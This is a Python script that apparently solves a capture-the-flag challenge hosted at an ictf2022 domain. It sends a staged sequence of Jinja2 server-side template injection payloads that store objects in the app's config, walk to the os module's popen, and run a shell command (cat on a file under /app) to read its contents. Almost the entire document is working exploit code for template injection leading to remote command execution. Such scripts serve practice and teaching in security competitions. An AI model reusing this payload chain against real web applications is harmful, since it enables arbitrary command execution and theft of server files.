import requests
import html

URL = "https://sstigolf.ictf2022.iciaran.com/"

print("-------- loop1: save config.__class__.__init__ to config")
query = "{{config.update(z=config.__class__.__init__)}}"
requestURL = f"{URL}ssti?query={query}"
response = requests.get(requestURL)
config = requests.get(f"{URL}ssti?query={{{{config.z}}}}")
print("requestURL:", requestURL)
print("response web:", response.text)
print("injected config:", html.unescape(config.text))


print("-------- loop2: inject ...__globals__['os'] class")
query = """{{config.update(z=config.z.__globals__['os'])}}"""
requestURL = f"{URL}ssti?query={query}"
response = requests.get(requestURL)
config = requests.get(f"{URL}ssti?query={{{{config.z}}}}")
print("requestURL:", requestURL)
print("response web:", response.text)
print("injected config:", html.unescape(config.text))

print("-------- loop3: inject popen class")
query = """{{config.update(z=config.z.popen)}}"""
requestURL = f"{URL}ssti?query={query}"
response = requests.get(requestURL)
config = requests.get(f"{URL}ssti?query={{{{config.z}}}}")
print("requestURL:", requestURL)
print("response web:", response.text)
print("injected config:", html.unescape(config.text))


print("-------- loop4")
query = """{{config.update(z=config.z(request.args.a))}}"""
command = """cat /app/an_arbitrarily_named_file"""
requestURL = f"{URL}ssti?query={query}&a={command}"
response = requests.get(requestURL)
config = requests.get(f"{URL}ssti?query={{{{config.z}}}}")
print("requestURL:", requestURL)
print("response web:", response.text)
print("injected config:", html.unescape(config.text))

print("-------- loop5")
query = """{{config.update(z=config.z.read())}}"""
requestURL = f"{URL}ssti?query={query}"
response = requests.get(requestURL)
config = requests.get(f"{URL}ssti?query={{{{config.z}}}}")
print("requestURL:", requestURL)
print("response web:", response.text)
print("injected config:", html.unescape(config.text))
